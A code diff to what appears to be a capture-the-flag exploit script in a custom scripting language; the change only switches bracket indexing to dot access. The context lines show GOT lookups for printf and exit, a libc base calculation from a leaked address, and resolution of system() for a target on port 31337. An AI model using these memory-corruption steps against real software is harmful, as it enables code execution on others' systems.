@@ -7,9 +7,9 @@ let port = 31337
 
 # Analyze binary
 let elf = analyze(binary)
-let got_printf = elf["got"]["printf"]
-let got_exit = elf["got"]["exit"]
-let win_func = elf["symbols"]["win"]
+let got_printf = elf.got.printf
+let got_exit = elf.got.exit
+let win_func = elf.symbols.win
 
 print("[*] Target GOT entries:")
 print("    printf@GOT:", hex(got_printf))
@@ -42,12 +42,12 @@ print("[+] Leaked printf@libc:", hex(printf_addr))
 
 # Calculate libc base dynamically using Libc object
 let libc_template = Libc("ubuntu20.04")
-let printf_offset = libc_template["symbols"]["printf"]
+let printf_offset = libc_template.symbols.printf
 let libc_base = printf_addr - printf_offset
 
 # Create resolved Libc object with known base
 let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
-let system = libc_resolved["symbols"]["system"]
+let system = libc_resolved.symbols.system
 print("[+] Libc base:", hex(libc_base))
 print("[+] system():", hex(system))
 
